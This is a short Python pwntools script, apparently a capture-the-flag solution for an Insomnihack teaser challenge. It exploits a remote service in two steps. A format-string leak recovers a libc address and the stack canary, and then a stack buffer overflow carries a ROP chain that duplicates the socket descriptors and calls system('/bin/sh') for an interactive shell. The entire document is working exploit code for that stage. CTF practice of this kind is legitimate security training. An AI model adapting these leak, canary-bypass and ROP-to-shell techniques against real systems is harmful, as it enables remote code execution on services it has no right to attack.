#!/usr/bin/python
from pwn import *
context.arch = 'amd64'
def leak_first():
    p.sendlineafter("> ",'2')
    p.sendlineafter("> ",'%llx-'*158)
    val = p.recvline().strip().split('-')
    p.sendline('')
    libc,canary = int(val[-2],16),int(val[137],16)
    return libc-0x20830,canary
 
def bof_stack():
	p.sendlineafter("> ","1")
	rop = ROP(elf)
	rop.dup2(4,0); rop.dup2(4,1)
	rop.system(elf.search("/bin/sh\x00").next()) 
	payload = "A"*8*129 + p64(canary) +  "A"*8 	+ str(rop)
	p.sendlineafter("?",str(len(payload)+1))
	p.sendline(payload)
	p.interactive()

if __name__ == "__main__":
    p = remote("baby.teaser.insomnihack.ch",1337)
    libc,canary=leak_first()
    elf = ELF("libc.so")
    elf.address = libc
    binsh = elf.search("/bin/sh").next()
    system = elf.symbols['system']
    dup2 = elf.symbols['dup2']
    bof_stack()
